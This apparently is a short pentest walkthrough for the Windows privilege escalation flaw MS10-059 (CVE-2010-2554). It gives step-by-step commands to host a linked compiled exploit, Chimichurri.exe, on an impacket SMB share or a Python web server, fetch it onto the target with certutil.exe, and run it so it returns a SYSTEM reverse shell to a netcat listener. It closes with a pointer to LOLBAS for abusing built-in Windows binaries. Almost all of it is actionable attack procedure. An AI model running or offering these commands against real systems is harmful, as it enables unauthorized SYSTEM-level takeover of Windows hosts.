| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| CVE-2010-2554 / MS10-059 | Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege. Chimichurri.exe | win_server_2008 sp_2 arc_x86,win_vista sp_1 sp_2 arc_x86,win_server_2008 arc_x86,win_10 arc_x86,win_server_2008 arc_x64,win_vista sp_1 sp_2 arc_x64,win_server_2008 sp_2 arc_x64,win_10 arc_x64 |

<br><br>

First download the file [Chimichurri.exe](https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe) on your local machine and start a samba server using impacket-smbserver

```sh
sudo impacket-smbserver myshare `pwd` -smb2
```

We can directly execute the file from the smb server. The exploit program takes IP and Port as arguments and sends a reverse shell back. We start a netcat listener on port 9001 to catch the System shell.<br>
Now from our target's user Shell execute : 

```sh
\\<Your-Machine-IP>\myshare\Chimichurri.exe <Your-Machine-IP> 9001
```

Wait a few seconds and you just got a System shell on your netcat listener!<br>
Alternatively, you can host the file from your local machine using python SimpleHTTPServer, upload it to the target machine using certutil.exe and then execute the program.

```sh
certutil.exe -urlcache -f -split "http://<Your-Machine-IP>:8000/Chimichurri.exe" Chimichurri.exe
Chimichurri.exe <Your-Machine-IP> 9001

```
if you didn't know about certutil.exe, then I highly recommend to checkout [LOLBAS](https://lolbas-project.github.io/#) for cool binaries in windows that can be taken advantage of to do various kinds of stuffs.